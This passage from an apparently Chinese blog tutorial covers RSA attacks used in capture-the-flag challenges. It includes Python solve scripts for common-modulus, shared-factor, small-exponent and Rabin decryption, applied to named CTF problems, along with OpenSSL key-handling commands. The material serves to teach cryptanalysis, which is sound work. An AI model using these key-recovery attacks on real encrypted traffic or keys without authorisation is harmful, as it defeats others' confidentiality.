class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure>
</li>
<li><p>中国剩余定理，也叫孙子定理：用来求同于方程组（这里在数论中做题不复杂，一到代码是真的复杂）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535853531.62.png" alt></p>
<p>直接贴上大佬的代码：（解决了互质与不互质两种情况）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,ai分别表示模数和取模后的值,都为列表结构</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#不成立则不存在解</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(解,最小公倍数)</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="应用中一些函数、模块的支撑"><a href="#应用中一些函数、模块的支撑" class="headerlink" title="应用中一些函数、模块的支撑"></a>应用中一些函数、模块的支撑</h3><blockquote>
<p>这里不得不感慨python的强大与方便，提供了gmpy2库、libnum库、pycrypto模块等第三方库，避免了从底层一步一步的写代码（其实也是太菜了，这种基于数论的代码是真的写不出来）</p>
</blockquote>
<ul>
<li><p>gmpy2库、libnum库，主要提供各种数学运算的函数库，向求逆元，取模等运算直接调运函数就可以，很便捷</p>
</li>
<li><p>关于两个库的说明链接如下：</p>
</li>
</ul>
<ul>
<li>pycrypto模块是python中来处理加密解密等信息安全相关的一个重要模块，提供了对称加密、非对称加密、散列哈希的一些计算方法，满足我们在密码学应用上的使用，就RSA可以实现公私钥的提取，生成，利用公私钥进行加解密等，之前写过的一篇文章有介绍</li>
</ul>
<ul>
<li><p>关于RSA中n的分解：</p>
<p>有在线分解：[]:<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a>  </p>
<p>离线的[yafu]:<a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a>   （p,q相差较大或较小时可快速分解）</p>
</li>
<li><p>除了用代码，还可以用OpenSSL对一些标准格式的RSA加解密</p>
<p>使用OpenSSL提取公钥信息：<code>openssl rsa -pubin -in (文件名) -text</code></p>
<p>使用OpenSSL提取私钥信息：<code>openssl rsa -in (文件名) -text</code></p>
<p>使用OpenSSL进行公钥加密：<code>openssl rsautl -encrypt -in test -out test.enc -inkey asn1pub.pem -pubin</code></p>
<p>使用OpenSSL进行私钥解密：<code>openssl rsautl -decrypt -in test.enc -out test.dec -inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行私钥签名：<code>openssl rsautl -sign -in test -out test.sig-inkey asn1enc.pem</code></p>
<p>使用OpenSSL进行公钥验证：<code>openssl rsautl -verify -in test.sig -out test.vfy -inkey asn1pub.pem -pubin</code></p>
</li>
</ul>
<h3 id="一些实际的应用："><a href="#一些实际的应用：" class="headerlink" title="一些实际的应用："></a>一些实际的应用：</h3><ul>
<li><p>RSA直接解密：</p>
<p>若已知私钥d，则可以直接解密： <code>m=pow(c,d,n)</code> :</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p:<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebeddL</span></span><br><span class="line"></span><br><span class="line">q:<span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873L</span></span><br><span class="line"></span><br><span class="line">e:<span class="number">0x190a000845e9c8c2059242835432326369aaf8c7ca85e685bba968b386155a91f1f7ca1019ff23d119222e1f0dfdeb0915d2e97601ef94bf15ca6d9211e984e9038f263f4984355c397ed22d67c26da6d31acfc4d599c70cba80859bee099e5a2dc3ab23aecf58f73f44d07318f70985c623d9612efefb15bf8dab77d5d54e85L</span></span><br><span class="line"></span><br><span class="line">d:<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5L</span> </span><br><span class="line"></span><br><span class="line">c:<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9L</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="number">0x23091e42fa7609c73f1941b320fad6d2ff6e47be588d1623f970f1fee7abd221c9834b208f3c888902fe87ca76ec1e1363757d93c6e25c49f1c61c72b141c0b8848b54a117427d8e30eeab89694eb5f849cafecb0e5361b9b2b0e3f89e0fdbcc66a6aad4a1a4a85d828083a01a5d569b7eeb6f9151794453382b524aa52993f9</span></span><br><span class="line">d=<span class="number">0x28b95b7e3159a851cbf537e007ae49864b7dbb93fc370a5</span></span><br><span class="line">n=<span class="number">0x9a724c6747de9eadccd33f4d60ada91754b8be8c65590cafe66f69a2f4afbfd359e47ca6fd2dbde8948062dc116bc574f4313ab99b2bb6d8ae47beaa0c1ebedd</span> * <span class="number">0x8c1c81cc005ce3dd6d684ebb88151dc0c53b1cef8a29b1cb8121860fb57d93117bf449aac4300dc6103ac6211c6f8ae68987d99aff0dd8967a4afa00f2116873</span></span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:len(hex(m))<span class="number">-1</span>].decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure>
<p>若已知质数p和q，则通过依次计算欧拉函数、私钥d可解密。实现如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) 	<span class="comment">#求e模phi的逆</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>
<p>在选取加密指数e时要求phi，e互质，也就是<code>gcd(phi,e)==1</code> ，如果不满足是无法直接解密的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x**33=1926041757553905692219721422025224638913707 mod 3436415358139016629092568198745009225773259</span><br><span class="line">tell me the smallest answer of x</span><br><span class="line">n = 3436415358139016629092568198745009225773259=3881 · 885445853681787330351086884500131209939</span><br><span class="line">e = 33</span><br><span class="line">c = 1926041757553905692219721422025224638913707</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">gcd(phi,33)==3 -&gt; e = 11</span><br><span class="line">n分解以后不满足互素的要求，先用逆元11得到x^3的值,然后爆破X</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">1926041757553905692219721422025224638913707</span></span><br><span class="line">n = <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">e = <span class="number">33</span></span><br><span class="line">p = <span class="number">3881</span></span><br><span class="line">q = <span class="number">885445853681787330351086884500131209939</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = libnum.invmod(e/<span class="number">3</span>, phi)</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">x3 = pow(c, d, n)</span><br><span class="line"><span class="keyword">print</span> x3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(i)</span>:</span></span><br><span class="line">    x, b = gmpy2.iroot(x3 + i *n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> x</span><br><span class="line">        exit()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">    calc(j)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535857638.43.png" alt></p>
</li>
<li><p>模不互质（<code>gcd(N1,N2)!=1</code>）适用情况：存在两个或更多模数，且<code>gcd(N1,N2)!=1</code> 多个模数n共用质数，则可以很容易利用欧几里得算法求得他们的质因数之一<code>gcd(N1,N2)</code> ，然后这个最大公约数可用于分解模数分别得到对应的p和q，即可进行解密。</p>
</li>
<li><p>共模攻击：适用情况：明文m、模数n相同，公钥指数e、密文c不同，gcd(e1,e2)==1 对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击。</p>
<p>python实现的证明代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    ∵gcd(e1,e2)==1,∴由扩展欧几里得算法，存在e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ∴m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># 若s1&lt;0，则c1^s1==(c1^-1)^(-s1)，其中c1^-1为c1模n的逆元。</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure>
<p>Xman-RSA(这道题利用了共模攻击和模不互素)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">    p = n % <span class="number">4</span></span><br><span class="line">    t = (p * p) % <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">    <span class="keyword">if</span> separate(i):</span><br><span class="line">        msg2 += flag[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1 * p2</span><br><span class="line">n2 = p1 * p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4 * p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure>
<p>n2，n3已知，利用共模攻击得到n1，由<code>gcd(n1,n2)==p1</code> 分解n1，n2得到flag：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fix_py</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># decode encryption.encrypted</span></span><br><span class="line">    s1 = <span class="string">'abdefghijklmpqrtuvwxyz'</span></span><br><span class="line">    s2 = <span class="string">'dmenwfoxgpyhirasbktclu'</span></span><br><span class="line">    f1 = open(<span class="string">'encryption.encrypted'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'encryption.py'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f1.readlines():</span><br><span class="line">            tmp = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">                tmp += s2[s1.index(j)] <span class="keyword">if</span> j <span class="keyword">in</span> s1 <span class="keyword">else</span> j</span><br><span class="line">            f2.write(tmp)</span><br><span class="line"><span class="comment"># fix_py()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    m %= n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[n2, n3] = map(<span class="keyword">lambda</span> x: int(base64.b64decode(x).encode(<span class="string">'hex'</span>), <span class="number">16</span>),</span><br><span class="line">               open(<span class="string">'n2&amp;n3'</span>).readlines())</span><br><span class="line">[n1c1, n1c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'n1.encrypted'</span>).readlines())</span><br><span class="line">[msg1c1, msg2c2] = map(<span class="keyword">lambda</span> x: int(x, <span class="number">16</span>), open(<span class="string">'ciphertext'</span>).readlines())</span><br><span class="line"><span class="comment"># 通过共模攻击得到n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">n1 = common_modulus(n3, e1, e2, n1c1, n1c2)</span><br><span class="line"><span class="comment"># n1,n2有一个共有质因数p1</span></span><br><span class="line"><span class="comment"># n1 += n3  # 存在n3比n1小的可能，并且确实如此;貌似主办方中途改题，把n1改成小于n3了。</span></span><br><span class="line">p1 = gmpy2.gcd(n1, n2)</span><br><span class="line"><span class="keyword">assert</span> (p1 != <span class="number">1</span>)</span><br><span class="line">p2 = n1 / p1</span><br><span class="line">p3 = n2 / p1</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d1 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e, (p1 - <span class="number">1</span>) * (p3 - <span class="number">1</span>))</span><br><span class="line">msg1 = pow(msg1c1, d1, n1)</span><br><span class="line">msg2 = pow(msg2c2, d2, n2)</span><br><span class="line">msg1 = hex(msg1)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line">msg2 = hex(msg2)[<span class="number">2</span>:].decode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> msg1, msg2</span><br><span class="line"><span class="comment"># XA&#123;RP0I_0Itrsigi s.y</span></span><br><span class="line"><span class="comment"># MNCYT_55_neetnvmrap&#125;</span></span><br><span class="line"><span class="comment"># XMAN&#123;CRYPT0_I5_50_Interestingvim rsa.py&#125;</span></span><br></pre></td></tr></table></figure>
<p> RSA-CRYPTO(有两个公钥文件和两个flag文件。提取公钥对比，n相同且可解密，共模攻击)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./pubkey2.pem'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">     key = RSA.importKey(f)</span><br><span class="line">     n = key.n</span><br><span class="line">     e = key.e</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (n)</span><br><span class="line"><span class="keyword">print</span> (e)</span><br><span class="line"><span class="comment">#提取两个公钥都是这个脚本</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535858774.6.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#共模攻击</span></span><br><span class="line">n =  <span class="number">0x8989a398988456b3fef4a6ad86df3c99577f8978048de5436befc30d8d8c94958912aa526ff333b66857306ebb8de36c2c396a84efdc5d382502daa1a3f3b6e97502d2e31c849330f5b4c95257a149a97f5954eaf89341147adcdd4e950fff74e30bbe622876b42eeac86df4ad9715d05b5604aa8179424c7d9ac46bd6b5f322b2b5728ba148704a25a8efcc1e7c84ea7e5ce3e01703f04f94a431d9954bd7ae2c7dd6e879b35f8a2d4a5efbe737257bf99bd9ee66b15aff233fc77b558a487da5952fbe2b923da9c5eb46788c050336b7e36a5ed82d5c1b2aeb0e45bee405cbe72481db2568aa829eeac87d201a5a8ff5ee6f0be38192ab2839635f6c664217L</span></span><br><span class="line">e1 = <span class="number">2333</span></span><br><span class="line">e2 = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag1.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher1 =  f.read()</span><br><span class="line">    cipher1 = b64decode(cipher1).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher1 = string.atoi(cipher1,base = <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag2.enc'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cipher2 = f.read()</span><br><span class="line">    cipher2 = b64decode(cipher2).encode(<span class="string">'hex'</span>)</span><br><span class="line">    cipher2 = string.atoi(cipher2,base = <span class="number">16</span>)  <span class="comment">#将字符串转为整型数字,base 指定进制</span></span><br><span class="line"></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)        <span class="comment">#返回一个三元素的元组 g == gcd（a，b）和g == a * s + b * t</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    cipher1 = gmpy2.invert(cipher1,n)   <span class="comment">#求cipher1模n的逆(求逆元)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    cipher2 = gmpy2.invert(cipher2,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#powmod（x，y，m）返回（x ** y）mod m。指数y可以是负数，如果x mod m的逆存在，则返回正确的结果。否则，引发ValueError</span></span><br><span class="line">plain = gmpy2.powmod(cipher1, s, n) * gmpy2.powmod(cipher2, t, n) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> long_to_bytes(plain)</span><br></pre></td></tr></table></figure>
</li>
<li><p>小明文攻击：适用情况：e较小，一般为3。公钥e很小，明文m也不大的话，于是<code>m^e=k*n+m</code> 中的的k值很小甚至为0，爆破k或直接开三次方即可。</p>
<p>Jarvis OJ Extremely hard RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2,binascii,libnum,time</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=int(open(<span class="string">'extremelyhardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> time.asctime()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200000000</span>):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:</span><br><span class="line">        res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">print</span> i,res</span><br><span class="line">        <span class="keyword">print</span> libnum.n2s(res)</span><br><span class="line">        <span class="keyword">print</span> time.asctime()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Rabin加密中的N可被分解:Rabin加密是RSA的衍生算法，e==2是Rabin加密典型特征,一般先通过其他方法分解得到p，q，然后解密.</p>
<p>python实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span><span class="params">(c, p, q, e=<span class="number">2</span>)</span>:</span></span><br><span class="line">    n = p * q</span><br><span class="line">    mp = pow(c, (p + <span class="number">1</span>) / <span class="number">4</span>, p)</span><br><span class="line">    mq = pow(c, (q + <span class="number">1</span>) / <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(p, q)</span><br><span class="line">    yq = gmpy2.invert(q, p)</span><br><span class="line">    r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">    rr = n - r</span><br><span class="line">    s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">    ss = n - s</span><br><span class="line">    <span class="keyword">return</span> (r, rr, s, ss)</span><br></pre></td></tr></table></figure>
<p>Jarvis OJ hard RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n=<span class="number">0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span></span><br><span class="line">p=<span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q=<span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=int(open(<span class="string">'hardRSA.rar/flag.enc'</span>,<span class="string">'rb'</span>).read().encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">mp=pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">mq=pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">yp=gmpy2.invert(p,q)</span><br><span class="line">yq=gmpy2.invert(q,p)</span><br><span class="line">r=(yp*p*mq+yq*q*mp)%n</span><br><span class="line">rr=n-r</span><br><span class="line">s=(yp*p*mq-yq*q*mp)%n</span><br><span class="line">ss=n-s</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(r)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(rr)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(s)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(ss)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Wiener’s Attack:适用情况：e过大或过小(低解密指数攻击)</p>
<p>工具地址：[]:<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p>
<p>这里脚本运行报错的话，再脚本前加上：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span>   sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">10000000</span>)</span><br></pre></td></tr></table></figure>
<p>python实现：</p>
